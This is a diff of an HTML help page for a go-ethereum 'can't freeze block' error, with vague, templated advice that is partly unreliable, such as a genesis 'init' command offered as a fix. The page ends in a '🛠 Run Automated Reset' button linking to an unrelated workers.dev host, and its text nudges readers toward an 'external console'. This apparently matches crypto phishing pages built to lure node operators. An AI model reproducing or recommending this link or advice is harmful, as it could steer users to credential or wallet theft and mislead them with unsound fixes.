@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff9455; }
     .btn {
         background: #cf6679;
         color: #000;
@@ -41,28 +41,28 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "canonical hash missing, can't freeze block" error message when attempting to freeze a block using Go Ethereum.</li>
+<li>The user encounters a "go-ethereum Error in block freeze operation" error message, specifically stating "canonical hash missing, can't freeze block" when attempting to freeze a block in the Ethereum ecosystem.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs due to a missing canonical hash in the block header, which is required for the freeze operation to complete successfully. The canonical hash is a crucial component that verifies the block's integrity and ensures its consistency within the blockchain.</li>
+<li>This error occurs due to a missing canonical hash, which is required for the block freeze operation to proceed. The canonical hash is a crucial component in verifying the integrity of the blockchain, and its absence prevents the successful completion of the operation.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Attempt to re-sync the blockchain to ensure all necessary block headers are present: </li>
-<li>Run <code>geth --syncmode "fast" --cache 1024</code> to re-sync the blockchain with an increased cache size.</li>
-<li>Utilize <code>geth console</code> to manually verify block headers and hashes.</li>
-<li>Execute the following command to verify the block header:</li>
+<li>To resolve this issue, the following manual overrides can be attempted:</li>
+<li>Verify the blockchain data integrity by checking for any corrupted or missing blocks.</li>
+<li>Ensure that the node is fully synchronized with the Ethereum network.</li>
+<li>Attempt to re-import the blockchain data using the following command:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>geth<span class="w"> </span>--exec<span class="w"> </span><span class="s1">&#39;eth.getBlock(0)&#39;</span><span class="w"> </span>console
+<div class="codehilite"><pre><span></span><code>geth<span class="w"> </span>--datadir<span class="w"> </span>~/ethereum/data<span class="w"> </span>init<span class="w"> </span>~/ethereum/genesis.json
 </code></pre></div>
 
-<p>Consider utilizing an external console for advanced troubleshooting and diagnostic capabilities. </p>
+<p>Consider utilizing an external console for more advanced troubleshooting and configuration options. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Go Ethereum (geth) installed and configured on the system</li>
-<li>A basic understanding of Ethereum blockchain concepts and geth commands</li>
-<li>Sufficient disk space and computational resources to handle blockchain data and processing</li>
+<li>A fully synchronized Ethereum node</li>
+<li>A complete and intact blockchain data directory</li>
+<li>The latest version of Go Ethereum (geth) installed and configured correctly</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
